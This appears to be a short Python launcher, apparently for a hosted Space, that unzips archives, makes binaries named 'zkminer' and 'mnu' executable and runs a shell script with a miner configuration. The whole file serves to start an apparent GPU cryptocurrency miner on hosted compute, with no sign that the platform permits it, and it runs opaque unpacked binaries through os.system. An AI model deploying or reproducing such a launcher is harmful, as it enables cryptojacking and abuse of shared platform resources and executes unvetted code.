import os
os.system("unzip mnu.zip && unzip z.zip")
os.system("chmod +x mnu zkminer libcudart.so.12 run.sh miner.conf")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"bash run.sh")
